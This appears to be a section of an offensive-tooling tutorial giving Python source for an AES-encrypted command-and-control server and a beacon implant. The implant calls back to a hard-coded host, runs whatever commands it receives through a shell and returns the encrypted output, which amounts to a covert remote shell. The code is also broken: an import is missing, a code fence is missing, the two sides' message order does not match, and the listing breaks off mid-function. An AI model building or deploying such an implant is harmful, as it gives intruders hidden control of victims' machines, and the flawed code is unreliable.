### 4. Encrypted C2 Beacon (AES) ⭐⭐⭐⭐
Server: ```c2_server.py``` - Listens for encrypted beacons and decrypts them.
```python
#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket
import base64

KEY = b'Sixteen byte key'  # 16 bytes = AES-128
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 8443))
server.listen(1)

while True:
    client, addr = server.accept()
    print(f"[+] Beacon from {addr}")
    
    while True:
        data = client.recv(1024)
        if not data:
            break
            
        # Decrypt
        enc_data = base64.b64decode(data)
        iv = enc_data[:16]
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(enc_data[16:]), AES.block_size)
        
        print(f"[{addr}] {plaintext.decode()}")
        
        # Send command (encrypted)
        cmd = input("c2> ").encode()
        cmd_padded = pad(cmd, AES.block_size)
        iv = os.urandom(16)
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        enc_cmd = iv + cipher.encrypt(cmd_padded)
        client.send(base64.b64encode(enc_cmd))
    
    client.close()

```

from Crypto.Util.Padding import pad, unpad
import socket
import base64
import subprocess
import os
import time

KEY = b'Sixteen byte key'

def beacon(host='192.168.56.101', port=8443):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            while True:
                # Get command
                data = s.recv(4096)
                enc_data = base64.b64decode(data)
                iv = enc_data[:16]
                cipher = AES.new(KEY, AES.MODE_CBC, iv)
                cmd = unpad(cipher.decrypt(enc_data[16:]), AES.block_size).decode()
                
                # Execute + encrypt output
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = f"{result.stdout}{result.stderr}"
                output_padded = pad(output.encode(), AES.block_size)
                iv = os.urandom(16)
                cipher = AES.new(KEY, AES.MODE_CBC, iv)
                enc_output = base64.b64encode(iv + cipher.encrypt(output_padded))
                s.send(enc_output)

            time.sleep(30)  # Jitter
